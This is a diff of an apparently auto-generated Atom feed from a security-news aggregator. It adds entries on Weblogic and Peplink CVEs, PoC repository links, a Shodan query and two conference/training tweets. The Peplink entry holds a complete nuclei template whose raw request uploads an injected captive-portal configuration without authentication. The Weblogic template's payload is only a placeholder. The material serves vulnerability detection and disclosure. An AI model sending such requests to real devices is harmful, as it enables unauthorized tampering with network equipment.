@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-07-01T11:48:16.762Z</updated>
+  <updated>2025-07-01T12:00:42.986Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,136 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Weblogic Remote Command Execution (RCE) Vulnerability</title>
+    <link href="http://example.com/2025/07/01/github_1591674901/"/>
+    <id>http://example.com/2025/07/01/github_1591674901/</id>
+    <published>2025-07-01T12:00:42.990Z</published>
+    <updated>2025-07-01T12:00:42.986Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Weblogic Remote Command Execution (RCE) Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2020-14644</li></ul><p><strong>漏洞类型：</strong> 反序列化</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Weblogic 12.2.1.3.0、12.2.1.4.0和14.1.1.0.0版本因不当处理序列化对象而存在远程代码执行（RCE）漏洞。此模板利用CVE-2020-14644实现RCE。</p><p><strong>产品厂商：</strong> Oracle</p><p><strong>产品名称：</strong> Weblogic</p><p><strong>影响版本：</strong> 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12428">https://github.com/projectdiscovery/nuclei-templates/issues/12428</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h4 id="Is-there-an-existing-template-for-this"><a href="#Is-there-an-existing-template-for-this" class="headerlink" title="Is there an existing template for this?"></a>Is there an existing template for this?</h4><ul><li><input checked="" disabled="" type="checkbox"> I have searched the existing templates.</li></ul><h4 id="Template-requests"><a href="#Template-requests" class="headerlink" title="Template requests"></a>Template requests</h4><ul><li>…</li></ul><p>id: CVE-2020-14644</p><p>info:<br>  name: Weblogic Remote Command Execution (RCE) Vulnerability<br>  author: MuhammadWaseem<br>  severity: critical<br>  description: |<br>    Weblogic versions 12.2.1.3.0, 12.2.1.4.0, and 14.1.1.0.0 are vulnerable<br>    to remote code execution (RCE) due to improper handling of serialized<br>    objects. This template exploits CVE-2020-14644 to achieve RCE.<br>  tags: weblogic,rce,cve2020,java</p><p>http:</p><ul><li><table><thead><tr><th>raw:</th></tr></thead></table><pre><code class="hljs">POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: &#123;&#123;Hostname&#125;&#125;Content-Type: text/xmlConnection: close&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot;&gt;  &lt;soapenv:Header&gt;    &lt;wsa:Action&gt;&quot;http://schemas.xmlsoap.org/ws/2004/09/transfer/Create&quot;&lt;/wsa:Action&gt;  &lt;/soapenv:Header&gt;  &lt;soapenv:Body&gt;    &lt;test&gt;Exploit Payload&lt;/test&gt;  &lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</code></pre>matchers-condition: and<br>matchers:<ul><li>type: status<br>status:<ul><li>500</li></ul></li><li>type: word<br>part: body<br>words:<ul><li>“weblogic.wsee.jaxws.WsLoggingInterceptor”</li></ul></li></ul></li></ul><h4 id="Anything-else"><a href="#Anything-else" class="headerlink" title="Anything else?"></a>Anything else?</h4><p>id: CVE-2020-14644</p><p>info:<br>  name: Weblogic Remote Command Execution (RCE) Vulnerability<br>  author: MuhammadWaseem<br>  severity: critical<br>  description: |<br>    Weblogic versions 12.2.1.3.0, 12.2.1.4.0, and 14.1.1.0.0 are vulnerable<br>    to remote code execution (RCE) due to improper handling of serialized<br>    objects. This template exploits CVE-2020-14644 to achieve RCE.<br>  tags: weblogic,rce,cve2020,java</p><p>http:</p><ul><li><table><thead><tr><th>raw:</th></tr></thead></table><pre><code class="hljs">POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: &#123;&#123;Hostname&#125;&#125;Content-Type: text/xmlConnection: close&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot;&gt;  &lt;soapenv:Header&gt;    &lt;wsa:Action&gt;&quot;http://schemas.xmlsoap.org/ws/2004/09/transfer/Create&quot;&lt;/wsa:Action&gt;  &lt;/soapenv:Header&gt;  &lt;soapenv:Body&gt;    &lt;test&gt;Exploit Payload&lt;/test&gt;  &lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</code></pre>matchers-condition: and<br>matchers:<ul><li>type: status<br>status:<ul><li>500</li></ul></li><li>type: word<br>part: body<br>words:<ul><li>“weblogic.wsee.jaxws.WsLoggingInterceptor”</li></ul></li></ul></li></ul>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Weblogic Remote Command Execution (RCE)</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>offsectraining twitter update</title>
+    <link href="http://example.com/2025/07/01/twitter_3624300501/"/>
+    <id>http://example.com/2025/07/01/twitter_3624300501/</id>
+    <published>2025-07-01T12:00:34.006Z</published>
+    <updated>2025-07-01T12:00:34.002Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>博主：</strong> offsectraining</p><p><strong>推文：</strong> 🚨 2025年6月内容与平台更新公告！<br>🔗 <a href="https://t.co/kagxE4Idhl">https://t.co/kagxE4Idhl</a> </p><p>如果你错过了，这里有我们上个月发布的所有内容：</p><p>🔥 2条新学习路径：<br>🔗 <a href="https://t.co/srPxt4ooiy">https://t.co/srPxt4ooiy</a><br>🔗 <a href="https://t.co/MuEOnVoR42">https://t.co/MuEOnVoR42</a></p><p>🪲 10个新的CVE实验室</p><p>🧠 还有大量新的学习内容！</p><p><strong>链接：</strong> <a href="https://x.com/offsectraining/status/1940003444233830740">https://x.com/offsectraining/status/1940003444233830740</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; offsectraining&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 🚨 2025年6月内容与平台更新公告！&lt;br&gt;🔗 &lt;a href=&quot;https://t.co/kagxE4Idhl&quot;&gt;https://t.co</summary>
+      
+    
+    
+    
+    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
+    
+    
+    <category term="offsectraining" scheme="http://example.com/tags/offsectraining/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Oracle WebLogic Server 远程代码执行漏洞</title>
+    <link href="http://example.com/2025/07/01/github_3667102766/"/>
+    <id>http://example.com/2025/07/01/github_3667102766/</id>
+    <published>2025-07-01T12:00:31.654Z</published>
+    <updated>2025-07-01T12:00:31.650Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Oracle WebLogic Server 远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2020-2883</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Oracle WebLogic Server (10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0) 存在一个远程代码执行漏洞，原因是未经认证的访问通过IIOP和T3协议，允许网络攻击者接管服务器，利用需要通过网络访问IIOP或T3。</p><p><strong>产品厂商：</strong> Oracle</p><p><strong>产品名称：</strong> WebLogic Server</p><p><strong>影响版本：</strong> 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0</p><p><strong>搜索语法：</strong> product:”oracle weblogic”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12228">https://github.com/projectdiscovery/nuclei-templates/issues/12228</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h4 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h4><blockquote><p>Oracle WebLogic Server (10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0) contains a remote code execution caused by unauthenticated access via IIOP and T3 protocols, letting network attackers take over the server, exploit requires network access via IIOP or T3.</p></blockquote><h5 id="Severity-Critical"><a href="#Severity-Critical" class="headerlink" title="Severity: Critical"></a>Severity: <code>Critical</code></h5><h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h5><ul><li><a href="https://github.com/Qynklee/POC_CVE-2020-2883">https://github.com/Qynklee/POC_CVE-2020-2883</a></li><li><a href="https://vulncheck.com/xdb/7960bb5df13e">https://vulncheck.com/xdb/7960bb5df13e</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:Qynklee&#x2F;POC_CVE-2020-2883.git</li><li><a href="https://github.com/Al1ex/CVE-2020-2883">https://github.com/Al1ex/CVE-2020-2883</a></li><li><a href="https://vulncheck.com/xdb/407219371c37">https://vulncheck.com/xdb/407219371c37</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:Al1ex&#x2F;CVE-2020-2883.git</li><li><a href="https://github.com/FancyDoesSecurity/CVE-2020-2883">https://github.com/FancyDoesSecurity/CVE-2020-2883</a></li><li><a href="https://github.com/Y4er/WebLogic-Shiro-shell">https://github.com/Y4er/WebLogic-Shiro-shell</a></li><li><a href="https://vulncheck.com/xdb/da7b6fb2895f">https://vulncheck.com/xdb/da7b6fb2895f</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:Y4er&#x2F;WebLogic-Shiro-shell.git</li><li><a href="https://vulncheck.com/xdb/9ab580b3f80b">https://vulncheck.com/xdb/9ab580b3f80b</a></li><li>https&#x2F;&#x2F;&#x2F;gitee.com:akira09&#x2F;exphub.git</li><li><a href="https://github.com/ZZZWD/CVE-2020-2883">https://github.com/ZZZWD/CVE-2020-2883</a></li><li><a href="https://vulncheck.com/xdb/d55ddb5fac32">https://vulncheck.com/xdb/d55ddb5fac32</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:zzwlpx&#x2F;weblogicPoc.git</li><li><a href="https://github.com/MagicZer0/Weblogic_CVE-2020-2883_POC">https://github.com/MagicZer0/Weblogic_CVE-2020-2883_POC</a></li><li><a href="https://github.com/Y4er/CVE-2020-2883">https://github.com/Y4er/CVE-2020-2883</a></li><li><a href="https://vulncheck.com/xdb/7927833b7021">https://vulncheck.com/xdb/7927833b7021</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:Y4er&#x2F;CVE-2020-2883.git</li><li><a href="https://vulncheck.com/xdb/f0337df1320b">https://vulncheck.com/xdb/f0337df1320b</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:0xn0ne&#x2F;weblogicScanner.git</li></ul><h4 id="KEV-True"><a href="#KEV-True" class="headerlink" title="KEV: True"></a>KEV: True</h4><h4 id="Shodan-Query-product-oracle-weblogic"><a href="#Shodan-Query-product-oracle-weblogic" class="headerlink" title="Shodan Query: product:&quot;oracle weblogic&quot;"></a>Shodan Query: <code>product:&quot;oracle weblogic&quot;</code></h4><blockquote><p>Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(<code>-debug</code>) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. </p></blockquote><blockquote><p>Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.</p></blockquote><p>You can check the FAQ for the Nuclei Templates Community Rewards Program <a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md">here</a>.</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Oracle WebLogic Server 远程代码执行漏洞&lt;/p&gt;
+&lt;p&gt;</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>BlackHatEvents twitter update</title>
+    <link href="http://example.com/2025/07/01/twitter_2132729342/"/>
+    <id>http://example.com/2025/07/01/twitter_2132729342/</id>
+    <published>2025-07-01T12:00:25.593Z</published>
+    <updated>2025-07-01T12:00:25.590Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>博主：</strong> BlackHatEvents</p><p><strong>推文：</strong> 别错过#BHUSA简报会“高级Active Directory至Entra ID横向移动技术”。我们将介绍几种新的横向移动技术，这些技术能让我们绕过认证、多因素认证(MFA)、隐秘地窃取数据等更多内容&gt;&gt; <a href="https://t.co/kAYs26BaiZ">https://t.co/kAYs26BaiZ</a></p><p><strong>链接：</strong> <a href="https://x.com/BlackHatEvents/status/1940012514172924334">https://x.com/BlackHatEvents/status/1940012514172924334</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; BlackHatEvents&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 别错过#BHUSA简报会“高级Active Directory至Entra ID横向移动技术”。我们将介绍几种新的横向移动技术，这些技术能让我们绕</summary>
+      
+    
+    
+    
+    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
+    
+    
+    <category term="BlackHatEvents" scheme="http://example.com/tags/BlackHatEvents/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Peplink Captive Portal 未授权配置上传漏洞</title>
+    <link href="http://example.com/2025/07/01/github_1644031419/"/>
+    <id>http://example.com/2025/07/01/github_1644031419/</id>
+    <published>2025-07-01T12:00:17.609Z</published>
+    <updated>2025-07-01T12:00:17.605Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Peplink Captive Portal 未授权配置上传漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2023-49230</li></ul><p><strong>漏洞类型：</strong> 未授权访问</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> Peplink Captive Portal存在未授权上传漏洞，攻击者可以通过&#x2F;guest&#x2F;portal_admin_upload.cgi上传配置，效果在&#x2F;guest&#x2F;preview.cgi?portal_id&#x3D;1可见。</p><p><strong>产品厂商：</strong> Peplink</p><p><strong>产品名称：</strong> Peplink Captive Portal</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12195">https://github.com/projectdiscovery/nuclei-templates/issues/12195</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h4 id="Is-there-an-existing-template-for-this"><a href="#Is-there-an-existing-template-for-this" class="headerlink" title="Is there an existing template for this?"></a>Is there an existing template for this?</h4><ul><li><input checked="" disabled="" type="checkbox"> I have searched the existing templates.</li></ul><h4 id="Nuclei-Template"><a href="#Nuclei-Template" class="headerlink" title="Nuclei Template"></a>Nuclei Template</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">id:</span> <span class="hljs-string">cve-2023-49230</span><br><br><span class="hljs-attr">info:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">Peplink</span> <span class="hljs-string">Captive</span> <span class="hljs-string">Portal</span> <span class="hljs-string">Unauthenticated</span> <span class="hljs-string">Config</span> <span class="hljs-string">Upload</span><br>  <span class="hljs-attr">author:</span> <span class="hljs-string">srilakivarma</span><br>  <span class="hljs-attr">severity:</span> <span class="hljs-string">high</span><br>  <span class="hljs-attr">description:</span> <span class="hljs-string">|</span><br><span class="hljs-string">    Unauthenticated upload to /guest/portal_admin_upload.cgi with effect visible at /guest/preview.cgi?portal_id=1.</span><br><span class="hljs-string"></span>  <span class="hljs-attr">reference:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://nvd.nist.gov/vuln/detail/CVE-2023-49230</span><br>  <span class="hljs-attr">tags:</span> <span class="hljs-string">cve,</span> <span class="hljs-string">peplink,</span> <span class="hljs-string">upload,</span> <span class="hljs-string">unauth</span><br><br><span class="hljs-attr">http:</span><br>  <span class="hljs-comment"># Step 1: Upload configuration</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">raw:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">|</span><br><span class="hljs-string">        POST /guest/portal_admin_upload.cgi HTTP/1.1</span><br><span class="hljs-string">        Host: &#123;&#123;Hostname&#125;&#125;</span><br><span class="hljs-string">        Content-Type: multipart/form-data; boundary=---------------------------370611892836891531633729116268</span><br><span class="hljs-string"></span><br>        <span class="hljs-string">-----------------------------370611892836891531633729116268</span><br>        <span class="hljs-attr">Content-Disposition:</span> <span class="hljs-string">form-data;</span> <span class="hljs-string">name=&quot;option&quot;</span><br><br>        <span class="hljs-string">edit_page</span><br>        <span class="hljs-string">-----------------------------370611892836891531633729116268</span><br>        <span class="hljs-attr">Content-Disposition:</span> <span class="hljs-string">form-data;</span> <span class="hljs-string">name=&quot;mode&quot;</span><br><br>        <span class="hljs-string">submit</span><br>        <span class="hljs-string">-----------------------------370611892836891531633729116268</span><br>        <span class="hljs-attr">Content-Disposition:</span> <span class="hljs-string">form-data;</span> <span class="hljs-string">name=&quot;portal_id&quot;</span><br><br>        <span class="hljs-number">1</span><br>        <span class="hljs-string">-----------------------------370611892836891531633729116268</span><br>        <span class="hljs-attr">Content-Disposition:</span> <span class="hljs-string">form-data;</span> <span class="hljs-string">name=&quot;data&quot;</span><br><br>        &#123;<span class="hljs-string">&quot;status&quot;</span><span class="hljs-string">:&quot;ok&quot;</span>,<span class="hljs-string">&quot;config&quot;</span><span class="hljs-string">:</span>&#123;<span class="hljs-string">&quot;login&quot;</span><span class="hljs-string">:</span>&#123;<span class="hljs-string">&quot;access_mode&quot;</span><span class="hljs-string">:&quot;open&quot;</span>,<span class="hljs-string">&quot;message&quot;</span><span class="hljs-string">:&quot;&quot;</span>,<span class="hljs-string">&quot;tnc_content&quot;</span><span class="hljs-string">:&quot;Terms</span> <span class="hljs-string">and</span> <span class="hljs-string">Conditions.&quot;</span>,<span class="hljs-string">&quot;tnc_title&quot;</span><span class="hljs-string">:&quot;Terms</span> <span class="hljs-string">and</span> <span class="hljs-string">Conditions&quot;</span>,<span class="hljs-string">&quot;tnc_link&quot;</span><span class="hljs-string">:&quot;terms&quot;</span>,<span class="hljs-string">&quot;tnc_prompt&quot;</span><span class="hljs-string">:&quot;I</span> <span class="hljs-string">agree</span> <span class="hljs-string">to</span> <span class="hljs-comment">#TNC_LINK#&quot;,&quot;back_login_button&quot;:&quot;Back to Login&quot;,&quot;agree_button&quot;:&quot;Injected&quot;,&quot;session_id1&quot;:&quot; &quot;,&quot;session_id2&quot;:&quot; &quot;&#125;,&quot;common&quot;:&#123;&quot;hide_quota&quot;:&quot;no&quot;,&quot;landing_url&quot;:&quot;&quot;,&quot;logo_url&quot;:&quot;logo.cgi?portal_id=1&amp;type=preview&quot;,&quot;logo_url_def&quot;:&quot;logo.cgi?default=1&quot;,&quot;uploaded_logo_size&quot;:0,&quot;footer&quot;:&quot;Powered by Peplink.&quot;,&quot;footer_default&quot;:&quot;Powered by Peplink.&quot;&#125;,&quot;success&quot;:&#123;&#125;,&quot;reach_quota&quot;:&#123;&#125;,&quot;quota&quot;:&#123;&quot;limit&quot;:&#123;&quot;data&quot;:0,&quot;session_timeout&quot;:1800&#125;&#125;&#125;&#125;</span><br>        <span class="hljs-string">-----------------------------370611892836891531633729116268</span><br>        <span class="hljs-attr">Content-Disposition:</span> <span class="hljs-string">form-data;</span> <span class="hljs-string">name=&quot;logo_action&quot;</span><br><br>        <span class="hljs-string">x</span><br>        <span class="hljs-string">-----------------------------370611892836891531633729116268</span><br>        <span class="hljs-attr">Content-Disposition:</span> <span class="hljs-string">form-data;</span> <span class="hljs-string">name=&quot;logo&quot;;</span> <span class="hljs-string">filename=&quot;&quot;</span><br>        <span class="hljs-attr">Content-Type:</span> <span class="hljs-string">application/octet-stream</span><br><br>        <span class="hljs-string">-----------------------------370611892836891531633729116268--</span><br><br>    <span class="hljs-attr">matchers:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">type:</span> <span class="hljs-string">word</span><br>        <span class="hljs-attr">part:</span> <span class="hljs-string">body</span><br>        <span class="hljs-attr">words:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;&quot;status&quot;: &quot;save_success&quot;&#x27;</span><br>        <br></code></pre></td></tr></table></figure><h4 id="Relevant-dumped-responses"><a href="#Relevant-dumped-responses" class="headerlink" title="Relevant dumped responses"></a>Relevant dumped responses</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">[cve-2023-49230:word-1] [http] [high] https://redact.com/guest/portal_admin_upload.cgi<br></code></pre></td></tr></table></figure><h4 id="Anything-else"><a href="#Anything-else" class="headerlink" title="Anything else?"></a>Anything else?</h4><p><a href="https://www.tenable.com/cve/CVE-2023-49230">https://www.tenable.com/cve/CVE-2023-49230</a><br><a href="https://www.synacktiv.com/sites/default/files/2023-12/synacktiv-peplink-multiple-vulnerabilities.pdf">https://www.synacktiv.com/sites/default/files/2023-12/synacktiv-peplink-multiple-vulnerabilities.pdf</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Peplink Captive Portal 未授权配置上传漏洞&lt;/p&gt;
+&lt;p</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="未授权访问" scheme="http://example.com/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
+    
+  </entry>
   
   <entry>
     <title>NFC成网络犯罪新目标，恶意攻击数量半年激增35倍</title>
@@ -175,32 +305,6 @@
     <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
     
     <category term="星悦安全" scheme="http://example.com/tags/%E6%98%9F%E6%82%A6%E5%AE%89%E5%85%A8/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Weblogic Remote Command Execution (RCE) Vulnerability</title>
-    <link href="http://example.com/2025/07/01/github_1591674901/"/>
-    <id>http://example.com/2025/07/01/github_1591674901/</id>
-    <published>2025-07-01T11:30:16.903Z</published>
-    <updated>2025-07-01T11:30:16.899Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Weblogic Remote Command Execution (RCE) Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2020-14644</li></ul><p><strong>漏洞类型：</strong> 反序列化</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Weblogic版本12.2.1.3.0、12.2.1.4.0和14.1.1.0.0由于对序列化对象的处理不当，容易受到远程代码执行（RCE）攻击。此模板利用CVE-2020-14644实现RCE。</p><p><strong>产品厂商：</strong> Oracle</p><p><strong>产品名称：</strong> Weblogic</p><p><strong>影响版本：</strong> 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12428">https://github.com/projectdiscovery/nuclei-templates/issues/12428</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h4 id="Is-there-an-existing-template-for-this"><a href="#Is-there-an-existing-template-for-this" class="headerlink" title="Is there an existing template for this?"></a>Is there an existing template for this?</h4><ul><li><input checked="" disabled="" type="checkbox"> I have searched the existing templates.</li></ul><h4 id="Template-requests"><a href="#Template-requests" class="headerlink" title="Template requests"></a>Template requests</h4><ul><li>…</li></ul><p>id: CVE-2020-14644</p><p>info:<br>  name: Weblogic Remote Command Execution (RCE) Vulnerability<br>  author: MuhammadWaseem<br>  severity: critical<br>  description: |<br>    Weblogic versions 12.2.1.3.0, 12.2.1.4.0, and 14.1.1.0.0 are vulnerable<br>    to remote code execution (RCE) due to improper handling of serialized<br>    objects. This template exploits CVE-2020-14644 to achieve RCE.<br>  tags: weblogic,rce,cve2020,java</p><p>http:</p><ul><li><table><thead><tr><th>raw:</th></tr></thead></table><pre><code class="hljs">POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: &#123;&#123;Hostname&#125;&#125;Content-Type: text/xmlConnection: close&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot;&gt;  &lt;soapenv:Header&gt;    &lt;wsa:Action&gt;&quot;http://schemas.xmlsoap.org/ws/2004/09/transfer/Create&quot;&lt;/wsa:Action&gt;  &lt;/soapenv:Header&gt;  &lt;soapenv:Body&gt;    &lt;test&gt;Exploit Payload&lt;/test&gt;  &lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</code></pre>matchers-condition: and<br>matchers:<ul><li>type: status<br>status:<ul><li>500</li></ul></li><li>type: word<br>part: body<br>words:<ul><li>“weblogic.wsee.jaxws.WsLoggingInterceptor”</li></ul></li></ul></li></ul><h4 id="Anything-else"><a href="#Anything-else" class="headerlink" title="Anything else?"></a>Anything else?</h4><p>id: CVE-2020-14644</p><p>info:<br>  name: Weblogic Remote Command Execution (RCE) Vulnerability<br>  author: MuhammadWaseem<br>  severity: critical<br>  description: |<br>    Weblogic versions 12.2.1.3.0, 12.2.1.4.0, and 14.1.1.0.0 are vulnerable<br>    to remote code execution (RCE) due to improper handling of serialized<br>    objects. This template exploits CVE-2020-14644 to achieve RCE.<br>  tags: weblogic,rce,cve2020,java</p><p>http:</p><ul><li><table><thead><tr><th>raw:</th></tr></thead></table><pre><code class="hljs">POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: &#123;&#123;Hostname&#125;&#125;Content-Type: text/xmlConnection: close&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot;&gt;  &lt;soapenv:Header&gt;    &lt;wsa:Action&gt;&quot;http://schemas.xmlsoap.org/ws/2004/09/transfer/Create&quot;&lt;/wsa:Action&gt;  &lt;/soapenv:Header&gt;  